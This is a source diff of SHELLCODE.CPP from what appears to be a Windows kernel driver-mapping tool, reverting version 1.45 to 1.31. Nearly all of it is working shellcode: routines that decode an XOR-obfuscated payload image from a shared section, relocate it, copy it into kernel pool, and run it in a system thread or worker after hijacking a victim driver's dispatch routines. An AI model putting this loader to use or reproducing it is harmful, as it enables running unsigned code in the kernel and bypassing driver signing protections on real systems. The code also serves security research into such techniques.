@@ -1,12 +1,12 @@
 /*******************************************************************************
 *
-*  (C) COPYRIGHT AUTHORS, 2020 - 2025
+*  (C) COPYRIGHT AUTHORS, 2020 - 2023
 *
 *  TITLE:       SHELLCODE.CPP
 *
-*  VERSION:     1.45
+*  VERSION:     1.31
 *
-*  DATE:        30 Nov 2025
+*  DATE:        14 Apr 2023
 *
 *  Default driver mapping shellcode(s) implementation.
 *
@@ -35,7 +35,7 @@
 #define OB_DRIVER_PREFIX_SIZE       sizeof(OB_DRIVER_PREFIX) - sizeof(WCHAR)
 #define OB_DRIVER_PREFIX_MAXSIZE    sizeof(OB_DRIVER_PREFIX)
 
-#define MAX_BASE_SCIMPORTS_NODBGPRINT 7
+#define MAX_BASE_SCIMPORTS 7
 
 //
 // Import functions for shellcode.
@@ -77,7 +77,6 @@ typedef struct _FUNC_TABLE {
 #define SC_MAX_SIZE 2048
 #define SC_INIT_CODE_SIZE 16
 
-#pragma pack(push, 1)
 #define BOOTSTRAPCODE_SIZE_V1 ( SC_MAX_SIZE - SC_INIT_CODE_SIZE - \
     sizeof(ULONG) - sizeof(SIZE_T) - sizeof(PVOID) - sizeof(HANDLE) - sizeof(HANDLE) - sizeof(FUNC_TABLE) )
 
@@ -86,17 +85,11 @@ typedef struct _SHELLCODE {
     BYTE BootstrapCode[BOOTSTRAPCODE_SIZE_V1];
     ULONG Tag;
     SIZE_T SectionViewSize;
-    PVOID MmSectionObjectType; // Pointer to pointer
+    PVOID MmSectionObjectType;
     HANDLE SectionHandle;
     HANDLE ReadyEventHandle;
     FUNC_TABLE Import;
 } SHELLCODE, * PSHELLCODE;
-#pragma pack(pop)
-
-C_ASSERT(BOOTSTRAPCODE_SIZE_V1 > 0);
-C_ASSERT(sizeof(SHELLCODE) == SC_MAX_SIZE);
-C_ASSERT(FIELD_OFFSET(SHELLCODE, Tag) == SC_INIT_CODE_SIZE + BOOTSTRAPCODE_SIZE_V1);
-C_ASSERT(FIELD_OFFSET(SHELLCODE, Import) + sizeof(FUNC_TABLE) == SC_MAX_SIZE);
 
 //
 // Globals used during debug.
@@ -415,16 +408,12 @@ ULONG NTAPI DbgPrintTest(
     return 0;
 }
 
-//
-// In case if MSVC trashes shellcode use #pragma optimize("", off)
-//
-
 /*
 * ScLoaderRoutineV1
 *
 * Purpose:
 *
-* Bootstrap shellcode variant 4 (executed as code from preallocated area).
+* Bootstrap shellcode variant 4.
 * Read image from shared section, process relocs and run it in allocated system thread.
 *
 * IRQL: PASSIVE_LEVEL
@@ -438,7 +427,7 @@ VOID NTAPI ScLoaderRoutineV1(
     ULONG                           isz;
     HANDLE                          hThread;
     OBJECT_ATTRIBUTES               obja;
-    ULONG_PTR                       img, exbuffer;
+    ULONG_PTR                       Image, exbuffer, pos;
 
     PIMAGE_DOS_HEADER               dosh;
     PIMAGE_FILE_HEADER              fileh;
@@ -446,32 +435,24 @@ VOID NTAPI ScLoaderRoutineV1(
     PIMAGE_BASE_RELOCATION          rel;
 
     DWORD_PTR                       delta;
-    LPWORD                          chain;
-    DWORD                           c, rsz, k, off;
+    LPWORD                          chains;
+    DWORD                           c, p, rsz, k;
 
     PUCHAR                          ptr;
 
     PKEVENT                         ReadyEvent;
-    PVOID                           SectionRef, pvSharedSection = NULL, rawExAlloc;
+    PVOID                           SectionRef, pvSharedSection = NULL;
     SIZE_T                          ViewSize;
 
     PPAYLOAD_HEADER_V1              PayloadHeader;
-    POBJECT_TYPE*                   ppSecType;
 
 #ifdef ENABLE_DBGPRINT
     CHAR                            szFormat1[] = { 'S', '%', 'l', 'x', 0 };
     CHAR                            szFormat2[] = { 'F', '%', 'l', 'x', 0 };
 #endif
 
-    ppSecType = (POBJECT_TYPE*)ShellCode->MmSectionObjectType;
-
-    status = ShellCode->Import.ObReferenceObjectByHandle(
-        ShellCode->SectionHandle,
-        SECTION_ALL_ACCESS, 
-        (ppSecType ? *ppSecType : NULL), 
-        0, 
-        (PVOID*)&SectionRef, 
-        NULL);
+    status = ShellCode->Import.ObReferenceObjectByHandle(ShellCode->SectionHandle,
+        SECTION_ALL_ACCESS, (POBJECT_TYPE) * (PVOID**)ShellCode->MmSectionObjectType, 0, (PVOID*)&SectionRef, NULL);
 
     if (NT_SUCCESS(status)) {
 
@@ -496,56 +477,71 @@ VOID NTAPI ScLoaderRoutineV1(
             rsz = PayloadHeader->ImageSize;
             ptr = (PUCHAR)pvSharedSection + sizeof(PAYLOAD_HEADER_V1);
 
-            while (rsz--) {
+            do {
                 *ptr ^= k;
                 k = _rotl(k, 1);
                 ptr++;
-            }
+                --rsz;
+            } while (rsz != 0);
 
-            img = (ULONG_PTR)pvSharedSection + sizeof(PAYLOAD_HEADER_V1);
-            dosh = (PIMAGE_DOS_HEADER)img;
-            fileh = (PIMAGE_FILE_HEADER)(img + sizeof(DWORD) + dosh->e_lfanew);
+            Image = (ULONG_PTR)pvSharedSection + sizeof(PAYLOAD_HEADER_V1);
+            dosh = (PIMAGE_DOS_HEADER)Image;
+            fileh = (PIMAGE_FILE_HEADER)(Image + sizeof(DWORD) + dosh->e_lfanew);
             popth = (PIMAGE_OPTIONAL_HEADER)((PBYTE)fileh + sizeof(IMAGE_FILE_HEADER));
             isz = popth->SizeOfImage;
 
             //
             // Allocate memory for mapped image.
             //
-            rawExAlloc = ShellCode->Import.ExAllocatePoolWithTag(
+            exbuffer = (ULONG_PTR)ShellCode->Import.ExAllocatePoolWithTag(
                 NonPagedPool,
                 isz + PAGE_SIZE,
-                ShellCode->Tag);
+                ShellCode->Tag) + PAGE_SIZE;
 
-            if (rawExAlloc) {
+            if (exbuffer != 0) {
 
-                exbuffer = ((ULONG_PTR)rawExAlloc + (PAGE_SIZE - 1)) & ~(PAGE_SIZE - 1);
-                delta = exbuffer - popth->ImageBase;
+                exbuffer &= ~(PAGE_SIZE - 1);
 
-                //
-                // Relocate image.
-                //
-                if (popth->NumberOfRvaAndSizes > IMAGE_DIRECTORY_ENTRY_BASERELOC) {
-                    off = popth->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;
-                    rsz = popth->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;
-                    if (off && rsz && off + rsz <= isz) {
-                        rel = (PIMAGE_BASE_RELOCATION)(img + off);
+                if (popth->NumberOfRvaAndSizes > IMAGE_DIRECTORY_ENTRY_BASERELOC)
+                    if (popth->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress != 0)
+                    {
+                        rel = (PIMAGE_BASE_RELOCATION)((PBYTE)Image +
+                            popth->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
+
+                        rsz = popth->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;
+                        delta = (DWORD_PTR)exbuffer - popth->ImageBase;
                         c = 0;
+
                         while (c < rsz) {
-                            chain = (LPWORD)((PUCHAR)rel + sizeof(IMAGE_BASE_RELOCATION));
-                            for (off = sizeof(IMAGE_BASE_RELOCATION); off < rel->SizeOfBlock; off += sizeof(WORD), chain++) {
-                                if ((*chain >> 12) == IMAGE_REL_BASED_DIR64)
-                                    *(PULONG_PTR)(img + rel->VirtualAddress + (*chain & 0x0FFF)) += delta;
+                            p = sizeof(IMAGE_BASE_RELOCATION);
+                            chains = (LPWORD)((PBYTE)rel + p);
+
+                            while (p < rel->SizeOfBlock) {
+
+                                switch (*chains >> 12) {
+                                case IMAGE_REL_BASED_HIGHLOW:
+                                    *(LPDWORD)((ULONG_PTR)Image + rel->VirtualAddress + (*chains & 0x0fff)) += (DWORD)delta;
+                                    break;
+                                case IMAGE_REL_BASED_DIR64:
+                                    *(PULONGLONG)((ULONG_PTR)Image + rel->VirtualAddress + (*chains & 0x0fff)) += delta;
+                                    break;
+                                }
+
+                                chains++;
+                                p += sizeof(WORD);
                             }
+
                             c += rel->SizeOfBlock;
-                            rel = (PIMAGE_BASE_RELOCATION)((PUCHAR)rel + rel->SizeOfBlock);
+                            rel = (PIMAGE_BASE_RELOCATION)((PBYTE)rel + rel->SizeOfBlock);
                         }
                     }
-                }
 
                 //
                 // Copy image to allocated buffer. We can't use any fancy memcpy stuff here.
                 //
-                __movsb((PUCHAR)exbuffer, (const UCHAR*)img, isz);
+                isz >>= 3;
+                for (pos = 0; pos < isz; pos++)
+                    ((PULONG64)exbuffer)[pos] = ((PULONG64)Image)[pos];
 
                 //
                 // Create system thread with handler set to image entry point.
@@ -553,13 +549,8 @@ VOID NTAPI ScLoaderRoutineV1(
                 hThread = NULL;
                 InitializeObjectAttributes(&obja, NULL, OBJ_KERNEL_HANDLE, NULL, NULL);
 
-                status = PayloadHeader->PsCreateSystemThread(&hThread, 
-                    THREAD_ALL_ACCESS,
-                    &obja, 
-                    NULL, 
-                    NULL,
-                    (PKSTART_ROUTINE)(exbuffer + popth->AddressOfEntryPoint), 
-                    NULL);
+                status = PayloadHeader->PsCreateSystemThread(&hThread, THREAD_ALL_ACCESS, &obja, NULL, NULL,
+                    (PKSTART_ROUTINE)(exbuffer + popth->AddressOfEntryPoint), NULL);
 
                 if (NT_SUCCESS(status))
                     PayloadHeader->ZwClose(hThread);
@@ -569,7 +560,7 @@ VOID NTAPI ScLoaderRoutineV1(
                 //
                 PayloadHeader->IoStatus.Status = status;
 
-            } //ExAllocatePoolWithTag(rawExAlloc)
+            } //ExAllocatePoolWithTag(exbuffer)
 
             ShellCode->Import.ZwUnmapViewOfSection(NtCurrentProcess(),
                 pvSharedSection);
@@ -581,13 +572,8 @@ VOID NTAPI ScLoaderRoutineV1(
         //
         // Fire the event to let userland know that we're ready.
         //
-        status = ShellCode->Import.ObReferenceObjectByHandle(
-            ShellCode->ReadyEventHandle,
-            SYNCHRONIZE | EVENT_MODIFY_STATE, 
-            NULL, 
-            0, 
-            (PVOID*)&ReadyEvent, 
-            NULL);
+        status = ShellCode->Import.ObReferenceObjectByHandle(ShellCode->ReadyEventHandle,
+            SYNCHRONIZE | EVENT_MODIFY_STATE, NULL, 0, (PVOID*)&ReadyEvent, NULL);
         if (NT_SUCCESS(status))
         {
             ShellCode->Import.KeSetEvent(ReadyEvent, 0, FALSE);
@@ -618,7 +604,7 @@ NTSTATUS NTAPI ScDispatchRoutineV3(
 {
     NTSTATUS                        status;
     ULONG                           isz;
-    ULONG_PTR                       img, exbuffer;
+    ULONG_PTR                       Image, exbuffer, pos;
 
     PIO_STACK_LOCATION              StackLocation;
 
@@ -628,13 +614,13 @@ NTSTATUS NTAPI ScDispatchRoutineV3(
     PIMAGE_BASE_RELOCATION          rel;
 
     DWORD_PTR                       delta;
-    LPWORD                          chain;
-    DWORD                           c, rsz, k, off;
+    LPWORD                          chains;
+    DWORD                           c, p, rsz, k;
 
     PUCHAR                          ptr;
 
     PKEVENT                         ReadyEvent;
-    PVOID                           SectionRef, pvSharedSection = NULL, IopInvalidDeviceIoControl, rawExAlloc;
+    PVOID                           SectionRef, pvSharedSection = NULL, IopInvalidDeviceIoControl;
     SIZE_T                          ViewSize;
 
     PPAYLOAD_HEADER_V3              PayloadHeader;
@@ -642,7 +628,6 @@ NTSTATUS NTAPI ScDispatchRoutineV3(
     ULONG                           objectSize;
     HANDLE                          driverHandle;
     PDRIVER_OBJECT                  driverObject;
-    POBJECT_TYPE*                   ppSecType;
     OBJECT_ATTRIBUTES               objectAttributes;
     UNICODE_STRING                  driverName, regPath;
 
@@ -660,15 +645,9 @@ NTSTATUS NTAPI ScDispatchRoutineV3(
     if ((StackLocation->MajorFunction == IRP_MJ_CREATE)
         && (DeviceObject->SectorSize == 0))
     {
-        ppSecType = (POBJECT_TYPE*)ShellCode->MmSectionObjectType;
 
-        status = ShellCode->Import.ObReferenceObjectByHandle(
-            ShellCode->SectionHandle,
-            SECTION_ALL_ACCESS,
-            (ppSecType ? *ppSecType : NULL),
-            0,
-            (PVOID*)&SectionRef,
-            NULL);
+        status = ShellCode->Import.ObReferenceObjectByHandle(ShellCode->SectionHandle,
+            SECTION_ALL_ACCESS, (POBJECT_TYPE) * (PVOID**)ShellCode->MmSectionObjectType, 0, (PVOID*)&SectionRef, NULL);
 
         if (NT_SUCCESS(status)) {
 
@@ -693,56 +672,71 @@ NTSTATUS NTAPI ScDispatchRoutineV3(
                 rsz = PayloadHeader->ImageSize;
                 ptr = (PUCHAR)pvSharedSection + sizeof(PAYLOAD_HEADER_V3);
 
-                while (rsz--) {
+                do {
                     *ptr ^= k;
                     k = _rotl(k, 1);
                     ptr++;
-                }
+                    --rsz;
+                } while (rsz != 0);
 
-                img = (ULONG_PTR)pvSharedSection + sizeof(PAYLOAD_HEADER_V3);
-                dosh = (PIMAGE_DOS_HEADER)img;
-                fileh = (PIMAGE_FILE_HEADER)(img + sizeof(DWORD) + dosh->e_lfanew);
+                Image = (ULONG_PTR)pvSharedSection + sizeof(PAYLOAD_HEADER_V3);
+                dosh = (PIMAGE_DOS_HEADER)Image;
+                fileh = (PIMAGE_FILE_HEADER)(Image + sizeof(DWORD) + dosh->e_lfanew);
                 popth = (PIMAGE_OPTIONAL_HEADER)((PBYTE)fileh + sizeof(IMAGE_FILE_HEADER));
                 isz = popth->SizeOfImage;
 
                 //
                 // Allocate memory for mapped image.
                 //
-                rawExAlloc = ShellCode->Import.ExAllocatePoolWithTag(
+                exbuffer = (ULONG_PTR)ShellCode->Import.ExAllocatePoolWithTag(
                     NonPagedPool,
                     isz + PAGE_SIZE,
-                    ShellCode->Tag);
+                    ShellCode->Tag) + PAGE_SIZE;
 
-                if (rawExAlloc) {
+                if (exbuffer != 0) {
 
-                    exbuffer = ((ULONG_PTR)rawExAlloc + (PAGE_SIZE - 1)) & ~(PAGE_SIZE - 1);
-                    delta = exbuffer - popth->ImageBase;
+                    exbuffer &= ~(PAGE_SIZE - 1);
 
-                    //
-                    // Relocate image.
-                    //
-                    if (popth->NumberOfRvaAndSizes > IMAGE_DIRECTORY_ENTRY_BASERELOC) {
-                        off = popth->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;
-                        rsz = popth->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;
-                        if (off && rsz && off + rsz <= isz) {
-                            rel = (PIMAGE_BASE_RELOCATION)(img + off);
+                    if (popth->NumberOfRvaAndSizes > IMAGE_DIRECTORY_ENTRY_BASERELOC)
+                        if (popth->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress != 0)
+                        {
+                            rel = (PIMAGE_BASE_RELOCATION)((PBYTE)Image +
+                                popth->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
+
+                            rsz = popth->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;
+                            delta = (DWORD_PTR)exbuffer - popth->ImageBase;
                             c = 0;
+
                             while (c < rsz) {
-                                chain = (LPWORD)((PUCHAR)rel + sizeof(IMAGE_BASE_RELOCATION));
-                                for (off = sizeof(IMAGE_BASE_RELOCATION); off < rel->SizeOfBlock; off += sizeof(WORD), chain++) {
-                                    if ((*chain >> 12) == IMAGE_REL_BASED_DIR64)
-                                        *(PULONG_PTR)(img + rel->VirtualAddress + (*chain & 0x0FFF)) += delta;
+                                p = sizeof(IMAGE_BASE_RELOCATION);
+                                chains = (LPWORD)((PBYTE)rel + p);
+
+                                while (p < rel->SizeOfBlock) {
+
+                                    switch (*chains >> 12) {
+                                    case IMAGE_REL_BASED_HIGHLOW:
+                                        *(LPDWORD)((ULONG_PTR)Image + rel->VirtualAddress + (*chains & 0x0fff)) += (DWORD)delta;
+                                        break;
+                                    case IMAGE_REL_BASED_DIR64:
+                                        *(PULONGLONG)((ULONG_PTR)Image + rel->VirtualAddress + (*chains & 0x0fff)) += delta;
+                                        break;
+                                    }
+
+                                    chains++;
+                                    p += sizeof(WORD);
                                 }
+
                                 c += rel->SizeOfBlock;
-                                rel = (PIMAGE_BASE_RELOCATION)((PUCHAR)rel + rel->SizeOfBlock);
+                                rel = (PIMAGE_BASE_RELOCATION)((PBYTE)rel + rel->SizeOfBlock);
                             }
                         }
-                    }
 
                     //
                     // Copy image to allocated buffer. We can't use any fancy memcpy stuff here.
                     //
-                    __movsb((PUCHAR)exbuffer, (const UCHAR*)img, isz);
+                    isz >>= 3;
+                    for (pos = 0; pos < isz; pos++)
+                        ((PULONG64)exbuffer)[pos] = ((PULONG64)Image)[pos];
 
                     //
                     // Remember Victim IRP_MJ_PNP as invalid device request handler.
@@ -892,7 +886,7 @@ NTSTATUS NTAPI ScDispatchRoutineV3(
                     //
                     DeviceObject->SectorSize = 512;
 
-                } //ExAllocatePoolWithTag(rawExAlloc)
+                } //ExAllocatePoolWithTag(exbuffer)
 
                 ShellCode->Import.ZwUnmapViewOfSection(NtCurrentProcess(),
                     pvSharedSection);
@@ -937,7 +931,7 @@ NTSTATUS NTAPI ScDispatchRoutineV2(
 {
     NTSTATUS                        status;
     ULONG                           isz;
-    ULONG_PTR                       img, exbuffer;
+    ULONG_PTR                       Image, exbuffer, pos;
 
     PIO_STACK_LOCATION              StackLocation;
 
@@ -947,16 +941,15 @@ NTSTATUS NTAPI ScDispatchRoutineV2(
     PIMAGE_BASE_RELOCATION          rel;
 
     DWORD_PTR                       delta;
-    LPWORD                          chain;
-    DWORD                           c, rsz, k, off;
+    LPWORD                          chains;
+    DWORD                           c, p, rsz, k;
 
     PUCHAR                          ptr;
 
     PKEVENT                         ReadyEvent;
-    PVOID                           SectionRef, pvSharedSection = NULL, rawExAlloc;
+    PVOID                           SectionRef, pvSharedSection = NULL;
     SIZE_T                          ViewSize;
 
-    POBJECT_TYPE*                   ppSecType;
     PPAYLOAD_HEADER_V2              PayloadHeader;
 
     WORK_QUEUE_ITEM* WorkItem;
@@ -975,15 +968,8 @@ NTSTATUS NTAPI ScDispatchRoutineV2(
     if ((StackLocation->MajorFunction == IRP_MJ_CREATE)
         && (DeviceObject->SectorSize == 0))
     {
-        ppSecType = (POBJECT_TYPE*)ShellCode->MmSectionObjectType;
-
-        status = ShellCode->Import.ObReferenceObjectByHandle(
-            ShellCode->SectionHandle,
-            SECTION_ALL_ACCESS,
-            (ppSecType ? *ppSecType : NULL),
-            0,
-            (PVOID*)&SectionRef,
-            NULL);
+        status = ShellCode->Import.ObReferenceObjectByHandle(ShellCode->SectionHandle,
+            SECTION_ALL_ACCESS, (POBJECT_TYPE) * (PVOID**)ShellCode->MmSectionObjectType, 0, (PVOID*)&SectionRef, NULL);
 
         if (NT_SUCCESS(status)) {
 
@@ -1008,57 +994,71 @@ NTSTATUS NTAPI ScDispatchRoutineV2(
                 rsz = PayloadHeader->ImageSize;
                 ptr = (PUCHAR)pvSharedSection + sizeof(PAYLOAD_HEADER_V2);
 
-                while (rsz--) {
+                do {
                     *ptr ^= k;
                     k = _rotl(k, 1);
                     ptr++;
-                }
+                    --rsz;
+                } while (rsz != 0);
 
-                img = (ULONG_PTR)pvSharedSection + sizeof(PAYLOAD_HEADER_V2);
-                dosh = (PIMAGE_DOS_HEADER)img;
-                fileh = (PIMAGE_FILE_HEADER)(img + sizeof(DWORD) + dosh->e_lfanew);
+                Image = (ULONG_PTR)pvSharedSection + sizeof(PAYLOAD_HEADER_V2);
+                dosh = (PIMAGE_DOS_HEADER)Image;
+                fileh = (PIMAGE_FILE_HEADER)(Image + sizeof(DWORD) + dosh->e_lfanew);
                 popth = (PIMAGE_OPTIONAL_HEADER)((PBYTE)fileh + sizeof(IMAGE_FILE_HEADER));
                 isz = popth->SizeOfImage;
 
                 //
                 // Allocate memory for mapped image.
                 //
-                rawExAlloc = ShellCode->Import.ExAllocatePoolWithTag(
+                exbuffer = (ULONG_PTR)ShellCode->Import.ExAllocatePoolWithTag(
                     NonPagedPool,
                     isz + PAGE_SIZE,
-                    ShellCode->Tag);
+                    ShellCode->Tag) + PAGE_SIZE;
 
-                if (rawExAlloc) {
+                if (exbuffer != 0) {
 
-                    exbuffer = ((ULONG_PTR)rawExAlloc + (PAGE_SIZE - 1)) & ~(PAGE_SIZE - 1);
-                    delta = exbuffer - popth->ImageBase;
+                    exbuffer &= ~(PAGE_SIZE - 1);
 
-                    //
-                    // Relocate image.
-                    //
-                    if (popth->NumberOfRvaAndSizes > IMAGE_DIRECTORY_ENTRY_BASERELOC) {
-                        off = popth->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;
-                        rsz = popth->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;
-                        if (off && rsz && off + rsz <= isz) {
-                            rel = (PIMAGE_BASE_RELOCATION)(img + off);
+                    if (popth->NumberOfRvaAndSizes > IMAGE_DIRECTORY_ENTRY_BASERELOC)
+                        if (popth->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress != 0)
+                        {
+                            rel = (PIMAGE_BASE_RELOCATION)((PBYTE)Image +
+                                popth->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
+
+                            rsz = popth->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;
+                            delta = (DWORD_PTR)exbuffer - popth->ImageBase;
                             c = 0;
+
                             while (c < rsz) {
-                                chain = (LPWORD)((PUCHAR)rel + sizeof(IMAGE_BASE_RELOCATION));
-                                for (off = sizeof(IMAGE_BASE_RELOCATION); off < rel->SizeOfBlock; off += sizeof(WORD), chain++) {
-                                    if ((*chain >> 12) == IMAGE_REL_BASED_DIR64)
-                                        *(PULONG_PTR)(img + rel->VirtualAddress + (*chain & 0x0FFF)) += delta;
+                                p = sizeof(IMAGE_BASE_RELOCATION);
+                                chains = (LPWORD)((PBYTE)rel + p);
+
+                                while (p < rel->SizeOfBlock) {
+
+                                    switch (*chains >> 12) {
+                                    case IMAGE_REL_BASED_HIGHLOW:
+                                        *(LPDWORD)((ULONG_PTR)Image + rel->VirtualAddress + (*chains & 0x0fff)) += (DWORD)delta;
+                                        break;
+                                    case IMAGE_REL_BASED_DIR64:
+                                        *(PULONGLONG)((ULONG_PTR)Image + rel->VirtualAddress + (*chains & 0x0fff)) += delta;
+                                        break;
+                                    }
+
+                                    chains++;
+                                    p += sizeof(WORD);
                                 }
+
                                 c += rel->SizeOfBlock;
-                                rel = (PIMAGE_BASE_RELOCATION)((PUCHAR)rel + rel->SizeOfBlock);
+                                rel = (PIMAGE_BASE_RELOCATION)((PBYTE)rel + rel->SizeOfBlock);
                             }
                         }
-                    }
-
 
                     //
                     // Copy image to allocated buffer. We can't use any fancy memcpy stuff here.
                     //
-                    __movsb((PUCHAR)exbuffer, (const UCHAR*)img, isz);
+                    isz >>= 3;
+                    for (pos = 0; pos < isz; pos++)
+                        ((PULONG64)exbuffer)[pos] = ((PULONG64)Image)[pos];
 
                     //
                     // Allocate worker and run image entry point within system worker thread.
@@ -1088,7 +1088,7 @@ NTSTATUS NTAPI ScDispatchRoutineV2(
                     //
                     DeviceObject->SectorSize = 512;
 
-                } //ExAllocatePoolWithTag(rawExAlloc)
+                } //ExAllocatePoolWithTag(exbuffer)
 
                 ShellCode->Import.ZwUnmapViewOfSection(NtCurrentProcess(),
                     pvSharedSection);
@@ -1135,7 +1135,7 @@ NTSTATUS NTAPI ScDispatchRoutineV1(
     ULONG                           isz;
     HANDLE                          hThread;
     OBJECT_ATTRIBUTES               obja;
-    ULONG_PTR                       img, exbuffer;
+    ULONG_PTR                       Image, exbuffer, pos;
 
     PIO_STACK_LOCATION              StackLocation;
 
@@ -1145,16 +1145,15 @@ NTSTATUS NTAPI ScDispatchRoutineV1(
     PIMAGE_BASE_RELOCATION          rel;
 
     DWORD_PTR                       delta;
-    LPWORD                          chain;
-    DWORD                           c, rsz, k, off;
+    LPWORD                          chains;
+    DWORD                           c, p, rsz, k;
 
     PUCHAR                          ptr;
 
     PKEVENT                         ReadyEvent;
-    PVOID                           SectionRef, pvSharedSection = NULL, rawExAlloc;
+    PVOID                           SectionRef, pvSharedSection = NULL;
     SIZE_T                          ViewSize;
 
-    POBJECT_TYPE*                   ppSecType;
     PPAYLOAD_HEADER_V1              PayloadHeader;
 
 #ifdef ENABLE_DBGPRINT
@@ -1171,15 +1170,8 @@ NTSTATUS NTAPI ScDispatchRoutineV1(
     if ((StackLocation->MajorFunction == IRP_MJ_CREATE)
         && (DeviceObject->SectorSize == 0))
     {
-        ppSecType = (POBJECT_TYPE*)ShellCode->MmSectionObjectType;
-
-        status = ShellCode->Import.ObReferenceObjectByHandle(
-            ShellCode->SectionHandle,
-            SECTION_ALL_ACCESS,
-            (ppSecType ? *ppSecType : NULL),
-            0,
-            (PVOID*)&SectionRef,
-            NULL);
+        status = ShellCode->Import.ObReferenceObjectByHandle(ShellCode->SectionHandle,
+            SECTION_ALL_ACCESS, (POBJECT_TYPE) * (PVOID**)ShellCode->MmSectionObjectType, 0, (PVOID*)&SectionRef, NULL);
 
         if (NT_SUCCESS(status)) {
 
@@ -1204,56 +1196,71 @@ NTSTATUS NTAPI ScDispatchRoutineV1(
                 rsz = PayloadHeader->ImageSize;
                 ptr = (PUCHAR)pvSharedSection + sizeof(PAYLOAD_HEADER_V1);
 
-                while (rsz--) {
+                do {
                     *ptr ^= k;
                     k = _rotl(k, 1);
                     ptr++;
-                }
+                    --rsz;
+                } while (rsz != 0);
 
-                img = (ULONG_PTR)pvSharedSection + sizeof(PAYLOAD_HEADER_V1);
-                dosh = (PIMAGE_DOS_HEADER)img;
-                fileh = (PIMAGE_FILE_HEADER)(img + sizeof(DWORD) + dosh->e_lfanew);
+                Image = (ULONG_PTR)pvSharedSection + sizeof(PAYLOAD_HEADER_V1);
+                dosh = (PIMAGE_DOS_HEADER)Image;
+                fileh = (PIMAGE_FILE_HEADER)(Image + sizeof(DWORD) + dosh->e_lfanew);
                 popth = (PIMAGE_OPTIONAL_HEADER)((PBYTE)fileh + sizeof(IMAGE_FILE_HEADER));
                 isz = popth->SizeOfImage;
 
                 //
                 // Allocate memory for mapped image.
                 //
-                rawExAlloc = ShellCode->Import.ExAllocatePoolWithTag(
+                exbuffer = (ULONG_PTR)ShellCode->Import.ExAllocatePoolWithTag(
                     NonPagedPool,
                     isz + PAGE_SIZE,
-                    ShellCode->Tag);
+                    ShellCode->Tag) + PAGE_SIZE;
 
-                if (rawExAlloc) {
+                if (exbuffer != 0) {
 
-                    exbuffer = ((ULONG_PTR)rawExAlloc + (PAGE_SIZE - 1)) & ~(PAGE_SIZE - 1);
-                    delta = exbuffer - popth->ImageBase;
+                    exbuffer &= ~(PAGE_SIZE - 1);
 
-                    //
-                    // Relocate image.
-                    //
-                    if (popth->NumberOfRvaAndSizes > IMAGE_DIRECTORY_ENTRY_BASERELOC) {
-                        off = popth->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;
-                        rsz = popth->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;
-                        if (off && rsz && off + rsz <= isz) {
-                            rel = (PIMAGE_BASE_RELOCATION)(img + off);
+                    if (popth->NumberOfRvaAndSizes > IMAGE_DIRECTORY_ENTRY_BASERELOC)
+                        if (popth->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress != 0)
+                        {
+                            rel = (PIMAGE_BASE_RELOCATION)((PBYTE)Image +
+                                popth->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
+
+                            rsz = popth->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;
+                            delta = (DWORD_PTR)exbuffer - popth->ImageBase;
                             c = 0;
+
                             while (c < rsz) {
-                                chain = (LPWORD)((PUCHAR)rel + sizeof(IMAGE_BASE_RELOCATION));
-                                for (off = sizeof(IMAGE_BASE_RELOCATION); off < rel->SizeOfBlock; off += sizeof(WORD), chain++) {
-                                    if ((*chain >> 12) == IMAGE_REL_BASED_DIR64)
-                                        *(PULONG_PTR)(img + rel->VirtualAddress + (*chain & 0x0FFF)) += delta;
+                                p = sizeof(IMAGE_BASE_RELOCATION);
+                                chains = (LPWORD)((PBYTE)rel + p);
+
+                                while (p < rel->SizeOfBlock) {
+
+                                    switch (*chains >> 12) {
+                                    case IMAGE_REL_BASED_HIGHLOW:
+                                        *(LPDWORD)((ULONG_PTR)Image + rel->VirtualAddress + (*chains & 0x0fff)) += (DWORD)delta;
+                                        break;
+                                    case IMAGE_REL_BASED_DIR64:
+                                        *(PULONGLONG)((ULONG_PTR)Image + rel->VirtualAddress + (*chains & 0x0fff)) += delta;
+                                        break;
+                                    }
+
+                                    chains++;
+                                    p += sizeof(WORD);
                                 }
+
                                 c += rel->SizeOfBlock;
-                                rel = (PIMAGE_BASE_RELOCATION)((PUCHAR)rel + rel->SizeOfBlock);
+                                rel = (PIMAGE_BASE_RELOCATION)((PBYTE)rel + rel->SizeOfBlock);
                             }
                         }
-                    }
 
                     //
                     // Copy image to allocated buffer. We can't use any fancy memcpy stuff here.
                     //
-                    __movsb((PUCHAR)exbuffer, (const UCHAR*)img, isz);
+                    isz >>= 3;
+                    for (pos = 0; pos < isz; pos++)
+                        ((PULONG64)exbuffer)[pos] = ((PULONG64)Image)[pos];
 
                     //
                     // Create system thread with handler set to image entry point.
@@ -1277,7 +1284,7 @@ NTSTATUS NTAPI ScDispatchRoutineV1(
                     //
                     DeviceObject->SectorSize = 512;
 
-                } //ExAllocatePoolWithTag(rawExAlloc)
+                } //ExAllocatePoolWithTag(exbuffer)
 
                 ShellCode->Import.ZwUnmapViewOfSection(NtCurrentProcess(),
                     pvSharedSection);
@@ -1304,9 +1311,6 @@ NTSTATUS NTAPI ScDispatchRoutineV1(
     return STATUS_SUCCESS;
 }
 
-//
-// In case if MSVC trashes shellcode and you turned off optimization re-enable it here #pragma optimize("", on )
-//
